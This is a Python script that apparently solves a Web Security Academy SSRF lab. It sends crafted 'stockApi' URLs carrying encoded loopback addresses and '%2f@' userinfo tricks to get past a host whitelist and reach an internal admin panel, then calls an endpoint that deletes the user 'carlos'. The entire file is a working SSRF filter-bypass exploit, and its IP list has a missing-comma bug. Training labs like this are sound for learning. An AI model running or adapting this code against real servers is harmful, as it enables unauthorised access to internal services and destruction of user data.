import requests as r
from time import sleep
import urllib
link ="https://0abb00d40483cb3bc0dd45f9003d0073.web-security-academy.net/product/stock" # /product/stock



test_ip = [
"127.0.0.1",
"127%2e0%2e0%2e1",
"0177.0.0.1",
"0x7f.0.0.1"
"127.0.1",
"127.1",
"2130706433",
"017700000001",
"0x7f000001",
"localhost",
"loc%61lhost"
]

# http://link/
# http://localhost@link/ => work
# http://localhost%2f@link/ => work show localhost
# http://localhost%2f@link/admin => work show localhost/admin

# test1:  https://expected-host@evil-host
# test2   https://evil-host#expected-host
 
# whitelist: stock.weliketoshop.net

def test_addr(l):
    found_bypass = ""
    for i in test_ip:
        test_endpoint ="http://{}%2f@stock.weliketoshop.net/".format(i)
        #test_endpoint ="http://stock.weliketoshop.net@http://{}/".format(i)
        myreq = r.post(link , data={"stockApi":  test_endpoint})
        response = myreq.text 
        #print(myreq.headers)
        print("[+] testing :", test_endpoint , " status: ", myreq.status_code)
        

        if 'admin' in response.lower():
            found_bypass = test_endpoint
            print("Found bypass : ", found_bypass)
            myreq.close()
            return found_bypass
        sleep(0.4)
        myreq.close()



def delete_user(l,internal_l):
    snd_req=r.post(link,data={"stockApi":internal_l+"admin/delete?username=carlos"})
    response = snd_req.text 
    print(response)
if __name__ == "__main__":
    ep = test_addr(link)
    delete_user(link, ep)
